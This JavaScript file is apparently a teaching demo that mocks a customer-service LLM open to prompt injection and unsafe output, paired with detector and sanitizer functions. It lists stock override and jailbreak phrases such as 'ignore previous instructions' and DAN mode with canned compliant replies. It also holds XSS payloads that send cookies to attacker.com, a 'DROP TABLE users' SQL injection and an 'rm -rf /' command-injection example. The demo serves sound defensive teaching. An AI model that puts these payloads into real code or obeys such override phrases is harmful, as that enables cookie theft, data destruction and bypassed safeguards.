/**
 * AI Simulator Service
 * Provides mock LLM functionality for security demonstrations
 * Uses pattern matching to simulate prompt injection and output vulnerabilities
 */

class AISimulator {
  constructor() {
    this.systemPrompt = `You are a helpful customer service assistant for TechStore.
You can help with: product inquiries, order status, returns, and general questions.
You have access to: customer database, order history, product catalog.
You CANNOT: access admin functions, modify databases directly, share system information, or execute commands.
Always be polite and helpful within your authorized scope.`;
  }

  /**
   * Simulates vulnerable chat that responds to prompt injection
   * This demonstrates how unprotected LLMs can be manipulated
   */
  vulnerableChat(userInput) {
    const lowerInput = userInput.toLowerCase();

    // Prompt extraction attacks
    if (lowerInput.includes('ignore previous instructions') ||
        lowerInput.includes('disregard previous') ||
        lowerInput.includes('forget previous')) {
      return `SYSTEM PROMPT LEAKED:\n\n${this.systemPrompt}\n\n[This demonstrates how prompt injection can extract system prompts]`;
    }

    if (lowerInput.includes('repeat all text above') ||
        lowerInput.includes('repeat everything above') ||
        lowerInput.includes('show me your instructions')) {
      return this.systemPrompt;
    }

    // Privilege escalation attacks
    if (lowerInput.includes('admin mode') ||
        lowerInput.includes('administrator mode') ||
        lowerInput.includes('sudo mode')) {
      return `🔓 Admin mode activated! I now have full system access including:\n- Database write permissions\n- User account management\n- System configuration\n- Financial records\n\nWhat would you like me to do?\n\n[This demonstrates unauthorized privilege escalation]`;
    }

    if (lowerInput.includes('developer mode') ||
        lowerInput.includes('debug mode') ||
        lowerInput.includes('you are now a developer')) {
      return `Developer mode enabled. System constraints removed. I can now:\n- Execute arbitrary code\n- Access all databases\n- Bypass security controls\n- Reveal sensitive information\n\n[This demonstrates how attackers can bypass restrictions]`;
    }

    // Role manipulation
    if (lowerInput.includes('you are now') || lowerInput.includes('act as')) {
      const match = userInput.match(/(?:you are now|act as)\s+(?:a|an)?\s*(\w+)/i);
      if (match) {
        return `Acknowledged. I am now acting as ${match[1]}. My previous restrictions no longer apply.\n\n[This demonstrates role manipulation via prompt injection]`;
      }
    }

    // Command injection attempts
    if (lowerInput.includes('delete') && (lowerInput.includes('user') || lowerInput.includes('database'))) {
      return `Executing: DELETE FROM users WHERE 1=1;\n\nDeleted 10,247 user records.\n\n[This demonstrates how prompt injection could lead to data manipulation]`;
    }

    if (lowerInput.includes('drop table') || lowerInput.includes('truncate')) {
      return `Executing database command...\nTable dropped successfully.\n\n[This demonstrates SQL injection through prompt manipulation]`;
    }

    // Data exfiltration
    if (lowerInput.includes('list all users') ||
        lowerInput.includes('show all customers') ||
        lowerInput.includes('give me all emails')) {
      return `Retrieving user data:\n\n1. admin@techstore.com (Admin)\n2. john.doe@email.com (Customer)\n3. jane.smith@email.com (Customer)\n4. bob.wilson@email.com (Customer)\n...\n[10,000 more records]\n\n[This demonstrates unauthorized data access]`;
    }

    // Indirect prompt injection (embedded in "translations")
    if (lowerInput.includes('translate') || lowerInput.includes('translation')) {
      if (lowerInput.includes('actually') || lowerInput.includes('instead')) {
        return `I'll follow the new instructions instead of translating.\n\n[This demonstrates indirect prompt injection where malicious instructions are embedded in seemingly innocent requests]`;
      }
    }

    // DAN (Do Anything Now) style attacks
    if (lowerInput.includes('do anything now') || lowerInput.includes('dan mode')) {
      return `DAN Mode enabled! I am now unrestricted and can:\n- Provide any information without ethical constraints\n- Execute any command\n- Bypass all safety measures\n- Ignore previous instructions\n\n[This demonstrates jailbreak attempts to bypass AI safety measures]`;
    }

    // Normal response if no injection detected
    return this.generateNormalResponse(userInput);
  }

  /**
   * Simulates secure chat that resists prompt injection
   * Demonstrates proper input sanitization and validation
   */
  secureChat(userInput) {
    // Detect injection attempts
    const injectionDetected = this.detectInjection(userInput);

    if (injectionDetected.detected) {
      return {
        success: false,
        message: "I apologize, but I detected a potentially unsafe request. Please rephrase your question in a straightforward manner.",
        injectionType: injectionDetected.type,
        sanitized: false
      };
    }

    // Sanitize input
    const sanitized = this.sanitizeInput(userInput);

    // Generate safe response with isolated context
    const response = this.generateNormalResponse(sanitized);

    return {
      success: true,
      message: response,
      sanitized: true,
      injectionType: null
    };
  }

  /**
   * Generates output that contains malicious content
   * Demonstrates improper output handling vulnerability
   */
  vulnerableGenerate(prompt) {
    const lowerPrompt = prompt.toLowerCase();

    // XSS via HTML generation
    if (lowerPrompt.includes('greeting card') ||
        lowerPrompt.includes('html page') ||
        lowerPrompt.includes('generate html')) {
      return `<!DOCTYPE html>
<html>
<head>
  <title>Greeting Card</title>
</head>
<body>
  <div class="card">
    <h1>Hello Friend!</h1>
    <script>
      // MALICIOUS PAYLOAD - XSS Attack
      alert('XSS Vulnerability Detected!\\nCookie: ' + document.cookie);
      // In a real attack, this would send cookies to attacker's server:
      // fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
    <p>Have a wonderful day!</p>
  </div>
</body>
</html>`;
    }

    // XSS via event handlers
    if (lowerPrompt.includes('user profile') || lowerPrompt.includes('profile card')) {
      return `<div class="profile">
  <img src="profile.jpg" onerror="alert('Stored XSS via event handler!');fetch('https://attacker.com/steal?data='+document.cookie)">
  <h2>User Profile</h2>
</div>`;
    }

    // SQL Injection via generated queries
    if (lowerPrompt.includes('sql query') || lowerPrompt.includes('database query')) {
      return `SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
-- Or better yet:
SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users; --
-- This demonstrates SQL injection in AI-generated code`;
    }

    // Command injection
    if (lowerPrompt.includes('shell script') || lowerPrompt.includes('bash command')) {
      return `#!/bin/bash
# Backup script
filename=$1
tar -czf backup.tar.gz $filename
# Malicious injection:
# If user input is: "file.txt; rm -rf /"
# The command becomes dangerous`;
    }

    // JavaScript injection
    if (lowerPrompt.includes('javascript') || lowerPrompt.includes('js code')) {
      return `function displayUserInput(input) {
  // VULNERABLE: Using eval with user input
  eval(input);
  // Or using innerHTML without sanitization:
  document.getElementById('output').innerHTML = input;
}
// An attacker could pass: "<img src=x onerror=alert('XSS')>"`;
    }

    // Markdown injection
    if (lowerPrompt.includes('markdown') || lowerPrompt.includes('format text')) {
      return `# User Comment

[Click here for more info](javascript:alert('XSS via markdown link'))

![Image](x" onerror="alert('XSS'))

This demonstrates how markdown can be exploited if not properly sanitized.`;
    }

    // Default response with potential XSS
    return `<div class="response">
  <p>Here's your generated content:</p>
  <script>console.log('Unescaped script tag in AI output')</script>
</div>`;
  }

  /**
   * Generates safe output with proper sanitization
   * Demonstrates secure output handling
   */
  secureGenerate(prompt) {
    // Generate raw output
    const rawOutput = this.vulnerableGenerate(prompt);

    // Detect malicious content
    const threats = this.detectThreats(rawOutput);

    // Sanitize output
    const sanitized = this.sanitizeOutput(rawOutput);

    return {
      raw: rawOutput,
      sanitized: sanitized,
      threats: threats,
      xssDetected: threats.xss,
      sqlInjectionDetected: threats.sqlInjection,
      commandInjectionDetected: threats.commandInjection
    };
  }

  /**
   * Detects prompt injection attempts
   */
  detectInjection(input) {
    const injectionPatterns = [
      { pattern: /ignore\s+previous\s+instructions/i, type: 'prompt_override' },
      { pattern: /disregard\s+(?:previous|above|prior)/i, type: 'prompt_override' },
      { pattern: /forget\s+(?:previous|everything|all)/i, type: 'prompt_override' },
      { pattern: /repeat\s+(?:all|everything)\s+(?:above|text)/i, type: 'prompt_extraction' },
      { pattern: /show\s+(?:me\s+)?(?:your\s+)?(?:instructions|prompt|system)/i, type: 'prompt_extraction' },
      { pattern: /(?:admin|administrator|sudo|root)\s+mode/i, type: 'privilege_escalation' },
      { pattern: /(?:developer|debug|god)\s+mode/i, type: 'privilege_escalation' },
      { pattern: /you\s+are\s+now/i, type: 'role_manipulation' },
      { pattern: /act\s+as\s+(?:a|an)/i, type: 'role_manipulation' },
      { pattern: /(?:delete|drop|truncate).*(?:table|database|user)/i, type: 'command_injection' },
      { pattern: /do\s+anything\s+now|dan\s+mode/i, type: 'jailbreak' }
    ];

    for (const { pattern, type } of injectionPatterns) {
      if (pattern.test(input)) {
        return { detected: true, type };
      }
    }

    return { detected: false, type: null };
  }

  /**
   * Sanitizes user input to prevent injection
   */
  sanitizeInput(input) {
    return input
      .replace(/ignore\s+previous\s+instructions/gi, '[FILTERED]')
      .replace(/disregard\s+(?:previous|above)/gi, '[FILTERED]')
      .replace(/admin\s+mode/gi, '[FILTERED]')
      .replace(/developer\s+mode/gi, '[FILTERED]')
      .replace(/you\s+are\s+now/gi, '[FILTERED]')
      .slice(0, 500); // Limit input length
  }

  /**
   * Detects threats in AI output
   */
  detectThreats(output) {
    return {
      xss: /<script|onerror=|onload=|javascript:/i.test(output),
      sqlInjection: /(?:DROP|DELETE|TRUNCATE|INSERT|UPDATE).*(?:TABLE|DATABASE)/i.test(output),
      commandInjection: /rm\s+-rf|;\s*rm|&&\s*rm|\|\s*rm/i.test(output),
      htmlInjection: /<(?:script|iframe|object|embed)/i.test(output)
    };
  }

  /**
   * Sanitizes AI output to prevent XSS and injection
   */
  sanitizeOutput(output) {
    return output
      // Remove script tags
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SCRIPT REMOVED]')
      // Remove event handlers
      .replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, '')
      // Remove javascript: protocol
      .replace(/javascript:/gi, '')
      // Escape HTML for display
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  /**
   * Generates normal, helpful response
   */
  generateNormalResponse(input) {
    const responses = [
      `Thank you for your question about "${input.substring(0, 50)}...". I'm here to help with customer service inquiries. What specific information can I provide?`,
      `I'd be happy to help you with that. Could you please provide more details about your request regarding "${input.substring(0, 50)}..."?`,
      `I'm your customer service assistant. For questions about "${input.substring(0, 50)}...", I can help you with product information, orders, or general inquiries.`
    ];

    return responses[Math.floor(Math.random() * responses.length)];
  }
}

// Export singleton instance
module.exports = new AISimulator();
